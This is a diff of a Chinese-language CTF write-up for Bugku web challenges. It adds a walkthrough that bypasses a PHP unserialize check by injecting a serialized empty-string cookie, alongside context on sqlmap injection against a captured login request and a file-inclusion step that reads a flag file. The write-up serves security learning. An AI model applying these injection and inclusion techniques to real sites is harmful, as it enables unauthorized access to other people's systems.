@@ -2,6 +2,8 @@ web部分的37-50题
 
 # 这是一个神奇的登陆框
 
+![这是一个神奇的登陆框](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86.png)
+
 首先进行抓包，如上图所示，输入admin和123456，保存为1.txt，放在 E:\杂\c加加 目录下，然后用`sqlmap`进行注入。
 
 ```bash
@@ -139,6 +141,51 @@ if __name__ == "__main__":
 访问 http://123.206.31.85:49166/index.php?file=upload/201911191206089664.jpg，提示我们：about hello.php index.php this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload upload.php。
 
 然后访问 http://123.206.31.85:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt，得到flag
+
+# flag.php
+
+提示：hint，于是在URL后面加一个hint参数 http://123.206.87.240:8002/flagphp/?hint=1，得到了下面的php代码。变成一道代码审计题了，要我们在COOKIE字段中添加ISecer参数,值是$KEY序列化后的值。
+
+**其中有三个地方需要注意：**
+
+**1、需要用到cookie注入**
+
+**2、cookie注入时的payload要用到反序列化**
+
+**3、反序列化后还需要与$KEY类型相同，因为是“$KEY”，所以我们提交的cookie得是一个空字符串**
+
+```php
+<?php
+error_reporting(0);
+include_once("flag.php");
+$cookie = $_COOKIE['ISecer'];
+if(isset($_GET['hint'])){
+    show_source(__FILE__);
+}
+elseif (unserialize($cookie) === "$KEY")
+{   
+    echo "$flag";
+}
+else {
+?>
+
+<?php
+}
+$KEY='ISecer:www.isecer.com';
+?>
+```
+
+写个script，把$KEY序列化后的值打印出来
+
+```php
+<?php
+  $KEY = '';
+  $cookie = serialize($KEY);
+  echo $cookie;
+?>
+```
+
+运行上面的代码，输出：`s:0:"";` 然后进行burpsuite 抓包，如下图所示，得到了flag
 
 # sql注入2
 
